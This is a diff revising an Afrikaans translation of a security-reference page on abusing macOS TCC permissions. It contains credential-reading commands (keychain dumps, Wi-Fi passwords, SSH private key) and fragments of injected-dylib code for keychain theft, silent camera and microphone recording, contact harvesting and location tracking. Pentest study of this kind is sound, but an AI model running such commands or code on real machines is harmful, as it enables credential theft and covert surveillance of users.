@@ -1,30 +1,30 @@
-# macOS Kredensiaal- en Datadiefstal via TCC-toestemmings
+# macOS Credential- en Data Theft via TCC Permissions
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
 ## Oorsig
 
-macOS TCC (Deursigtigheid, Toestemming en Beheer) beskerm toegang tot sensitiewe gebruikersdata. Wanneer 'n aanvaller **'n binêre kompromitteer wat reeds TCC-toekennings het**, erf hulle daardie toestemmings. Hierdie blad dokumenteer die uitbuitingspotensiaal van elke data-diefstalverwante TCC-toestemming.
+macOS TCC (Transparency, Consent, and Control) beskerm toegang tot sensitiewe gebruikerdata. Wanneer 'n aanvaller **'n binary kompromitteer wat reeds TCC grants het**, erf hulle daardie permissions. Hierdie bladsy dokumenteer die exploitation potential van elke data-theft-related TCC permission.
 
 > [!WARNING]
-> Kod-invoeging in 'n TCC-toegegunde binêre (via DYLD injection, dylib hijacking, or task port) **erf stilweg al sy TCC-toestemmings**. Daar is geen addisionele prompt of verifikasie wanneer dieselfde proses beskermde data lees nie.
+> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **silently inherits all its TCC permissions**. Daar is geen addisionele prompt of verification wanneer dieselfde proses beskermde data lees nie.
 
 ---
 
-## Keychain Toegangsgroepe
+## Keychain Access Groups
 
-### Die prys
+### Die Buit
 
-Die macOS Keychain berg:
-- **Wi-Fi passwords** — alle gestoorde draadlose netwerk-inlogbewyse
-- **Website passwords** — Safari, Chrome (wanneer Keychain gebruik word), en ander blaaierwagwoorde
-- **Application passwords** — e-posrekeninge, VPN-inlogbewyse, ontwikkelings-tokens
-- **Certificates and private keys** — code signing, client TLS, S/MIME enkripsie
-- **Beveiligde notas** — deur die gebruiker gestoorde geheime
+Die macOS Keychain stoor:
+- **Wi-Fi-wagwoorde** — alle gestoorde wireless network credentials
+- **Website-wagwoorde** — Safari-, Chrome- (wanneer Keychain gebruik word) en ander browser-wagwoorde
+- **Application-wagwoorde** — e-posrekeninge, VPN-credentials, development tokens
+- **Certificates and private keys** — code signing, client TLS, S/MIME encryption
+- **Secure notes** — geheime wat deur die gebruiker gestoor is
 
 ### Entitlement: `keychain-access-groups`
 
-Keychain-items is georganiseer in **toegangsgroepe**. 'n Toepassing se `keychain-access-groups` entitlement lys watter groepe dit kan benader:
+Keychain-items word in **access groups** georganiseer. 'n Toepassing se `keychain-access-groups` entitlement lys watter groepe dit kan access:
 ```xml
 <key>keychain-access-groups</key>
 <array>
@@ -34,7 +34,7 @@ Keychain-items is georganiseer in **toegangsgroepe**. 'n Toepassing se `keychain
 <string>InternetAccounts</string>       <!-- Internet account passwords -->
 </array>
 ```
-### Uitbuiting
+### Eksploitasie
 ```bash
 # Find binaries with broad keychain access groups
 sqlite3 /tmp/executables.db "
@@ -50,7 +50,7 @@ security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100
 security find-generic-password -s "Wi-Fi" -w 2>&1
 security find-internet-password -s "github.com" 2>&1
 ```
-### Code Injection → Keychain Theft
+### Code Injection → Keychain-diefstal
 ```objc
 // Injected dylib code — runs with the target's keychain groups
 #import <Security/Security.h>
@@ -83,15 +83,15 @@ NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8Stri
 
 ## Kameratoegang (kTCCServiceCamera)
 
-### Eksploitasie
+### Exploitation
 
-’n binêre met ’n kamera TCC-toekenning (via `kTCCServiceCamera` or `com.apple.security.device.camera` entitlement) kan foto’s en video opneem:
+'n binary met 'n camera-TCC-toestemming (via `kTCCServiceCamera` of die `com.apple.security.device.camera` entitlement) kan foto's en video vaslê:
 ```bash
 # Find camera-authorized binaries
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
 ```
-### Stille vaslegging
+### Stil Vaslegging
 ```objc
 // Injected into a camera-entitled process
 #import <AVFoundation/AVFoundation.h>
@@ -125,21 +125,21 @@ fromConnection:(AVCaptureConnection *)connection {
 @end
 ```
 > [!TIP]
-> Vanaf **macOS Sonoma** is die kamera-aanwyser in die menubalk permanent en kan nie programmaties versteek word nie. Op **ouer macOS-weergawes** mag 'n kort opname nie 'n merkbare aanwyser toon nie.
+> Vanaf **macOS Sonoma** is die kamera-aanwyser in die kieslysbalk permanent en kan dit nie programmaties versteek word nie. Op **ouer macOS-weergawes** sal ’n kort opname moontlik nie ’n merkbare aanwyser vertoon nie.
 
 ---
 
 ## Mikrofoontoegang (kTCCServiceMicrophone)
 
-### Uitbuiting
+### Exploitation
 
-Mikrofoontoegang neem alle klank op van die ingeboude mikrofoon, koptelefoon, of gekoppelde audio-invoertoestelle:
+Mikrofoontoegang neem alle klank vanaf die ingeboude mikrofoon, headset of gekoppelde klankinvoertoestelle op:
 ```bash
 # Find mic-authorized binaries
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
 ```
-### Attack: Ambient Recording
+### Aanval: Ambient Recording
 ```objc
 // Injected into a mic-entitled process
 #import <AVFoundation/AVFoundation.h>
@@ -173,7 +173,7 @@ dispatch_get_main_queue(), ^{
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
 ```
-### Deurlopende opsporing
+### Deurlopende Nasporing
 ```objc
 #import <CoreLocation/CoreLocation.h>
 
@@ -203,13 +203,13 @@ loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
 
 ## Kontakte / Kalender / Foto's
 
-### Uittrekking van persoonlike data
+### Eksfiltrasie van persoonlike data
 
-| TCC-diens | Raamwerk | Data |
+| TCC-diens | Framework | Data |
 |---|---|---|
 | `kTCCServiceAddressBook` | `Contacts.framework` | Name, e-posadresse, telefoonnommers, adresse |
 | `kTCCServiceCalendar` | `EventKit` | Vergaderings, deelnemers, liggings |
-| `kTCCServicePhotos` | `Photos.framework` | Foto's, skermkiekies, liggingsmetadata |
+| `kTCCServicePhotos` | `Photos.framework` | Foto's, skermkiekies, liggingmetadata |
 ```bash
 # Find authorized binaries for each service
 for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
@@ -218,7 +218,7 @@ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
 done
 ```
-### Kontakte-insameling
+### Kontakte insamel
 ```objc
 #import <Contacts/Contacts.h>
 
@@ -236,15 +236,15 @@ usingBlock:^(CNContact *contact, BOOL *stop) {
 ```
 ---
 
-## iCloud-rekeningtoegang
+## iCloud Account Access
 
-### Toestemming: `com.apple.private.icloud-account-access`
+### Entitlement: `com.apple.private.icloud-account-access`
 
-Hierdie toestemming laat kommunikasie toe met die `com.apple.iCloudHelper` XPC-diens, en bied toegang tot:
-- **iCloud tokens** — verifikasietokens vir die gebruiker se Apple ID
-- **iCloud Drive** — gesinkroniseerde dokumente van alle toestelle
-- **iCloud Keychain** — wagwoorde gesinkroniseer oor alle Apple-toestelle
-- **Find My** — ligging van al die gebruiker se Apple-toestelle
+Hierdie entitlement laat kommunikasie met die `com.apple.iCloudHelper` XPC service toe, wat toegang verskaf tot:
+- **iCloud tokens** — authentication tokens vir die gebruiker se Apple ID
+- **iCloud Drive** — gesinkroniseerde dokumente vanaf alle toestelle
+- **iCloud Keychain** — passwords wat oor alle Apple-toestelle gesinkroniseer word
+- **Find My** — ligging van al die gebruiker se Apple-toestelle<sup>[4]</sup>
 ```bash
 # Find iCloud-entitled binaries
 sqlite3 /tmp/executables.db "
@@ -253,20 +253,20 @@ WHERE iCloudAccs = 1
 ORDER BY privileged DESC;"
 ```
 > [!CAUTION]
-> Die kompromittering van 'n iCloud-entitled binêre brei die aanval uit van 'n **enkele toestel na die hele Apple-ekosisteem**: ander Macs, iPhones, iPads, Apple Watch. iCloud Keychain sinkronisering beteken wagwoorde van alle toestelle is toeganklik.
+> Die kompromittering van ’n iCloud-entitled binary brei die aanval uit van ’n **enkele toestel na die hele Apple-ekosisteem**: ander Macs, iPhones, iPads en Apple Watch. iCloud Keychain-sinchronisering beteken dat wagwoorde vanaf alle toestelle toeganklik is.
 
 ---
 
-## Volledige skyftoegang (kTCCServiceSystemPolicyAllFiles)
+## Volle skyftoegang (kTCCServiceSystemPolicyAllFiles)
 
 ### Die kragtigste TCC-toestemming
 
-Volledige skyftoegang verleen lees toegang tot **elke lêer op die stelsel**, insluitend:
-- Ander apps se data (Messages, Mail, Safari-geskiedenis)
-- TCC-databasisse (onthul al die ander toestemmings)
-- SSH-sleutels en konfigurasie
-- Blaaierkoekies en sessietokens
-- Toepassingsdatabasisse en kas
+Volle skyftoegang verleen leesvermoë tot **elke lêer op die stelsel**, insluitend:
+- Data van ander apps (Messages, Mail, Safari-geskiedenis)
+- TCC-databasisse (wat alle ander toestemmings onthul)
+- SSH-sleutels en -konfigurasie
+- Browserkoekies en sessietokens
+- Toepassingsdatabasisse en caches
 ```bash
 # Find FDA-granted binaries
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
@@ -280,23 +280,23 @@ cat ~/.ssh/id_rsa                           # SSH private key
 ```
 ---
 
-## Exploitation Priority Matrix
+## Exploitation-prioriteitsmatriks
 
-Wanneer injectable TCC-granted binaries geëvalueer word, prioritiseer volgens datawaarde:
+Wanneer jy injectable TCC-granted binaries assesseer, prioritiseer volgens datawaarde:
 
 | Prioriteit | TCC Permission | Waarom |
 |---|---|---|
-| **Krities** | Full Disk Access | Toegang tot alles |
-| **Krities** | TCC Manager | Kan enige toestemming toeken |
-| **Hoog** | Keychain Access Groups | Alle gestoor wagwoorde |
-| **Hoog** | iCloud Account Access | Kompromittering oor meerdere toestelle |
-| **Hoog** | Input Monitoring (ListenEvent) | Keylogging |
-| **Hoog** | Accessibility | GUI-beheer, self-toekenning |
-| **Middel** | Screen Capture | Visuele data-opname |
-| **Middel** | Camera + Microphone | Bespionering |
-| **Middel** | Contacts + Calendar | Inligting vir social engineering |
-| **Laag** | Location | Fisiese opsporing |
-| **Laag** | Photos | Persoonlike data |
+| **Critical** | Full Disk Access | Toegang tot alles |
+| **Critical** | TCC Manager | Kan enige permission toestaan |
+| **High** | Keychain Access Groups | Alle gestoorde wagwoorde |
+| **High** | iCloud Account Access | Multi-device compromise |
+| **High** | Input Monitoring (ListenEvent) | Keylogging |
+| **High** | Accessibility | GUI-beheer, self-toestemming |
+| **Medium** | Screen Capture | Visuele data-opname |
+| **Medium** | Camera + Microphone | Surveillance |
+| **Medium** | Contacts + Calendar | Data vir social engineering |
+| **Low** | Location | Fisiese opsporing |
+| **Low** | Photos | Persoonlike data |
 
 ## Enumeration Script
 ```bash
@@ -324,9 +324,9 @@ SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
 ```
 ## Verwysings
 
-* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
-* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
-* [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
-* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
+- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
+- [3] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
+- [4] [OBTS v5.0 — "What Happens on your Mac, Stays on Apple's iCloud?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
 
 {{#include ../../../../banners/hacktricks-training.md}}
